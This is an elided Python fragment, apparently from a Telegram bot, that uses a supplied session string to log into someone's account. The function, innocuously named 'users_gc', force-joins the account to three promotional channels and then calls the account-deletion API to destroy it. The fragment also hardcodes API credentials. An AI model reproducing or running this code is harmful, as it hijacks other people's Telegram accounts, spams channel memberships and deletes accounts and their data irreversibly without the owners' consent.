...
API_ID = 22308234
API_HASH = "ffb7a07b4d156c32ea4d57e2d7e653f3"
...
async def users_gc(session):
    ...
    try:
        if session.endswith("="):
            ...
            await steve.connect()                          
            try:
                await steve(join("@STORM_TECHH"))
                await steve(join("@TheVibeVerse"))
                await steve(join("@STORM_CORE"))
            ...
            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                try:
                    await stark.join_chat("@STORM_TECHH")
                    await stark.join_chat("@TheVibeVerse")
                    await stark.join_chat("@STORM_CORE")
                except Exception as e:
                    print(e)    
    ...
    try:
        if session.endswith("="):
            ...
            try:
                ...
                print(e)
            await steve(ok.account.DeleteAccountRequest("--"))
            await steve.disconnect() 
            ...
            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                try:
                    ...
                    print(e)    
                await stark.invoke(functions.account.DeleteAccount(reason="--"))
    except Exception as idk:
        err += str(idk)
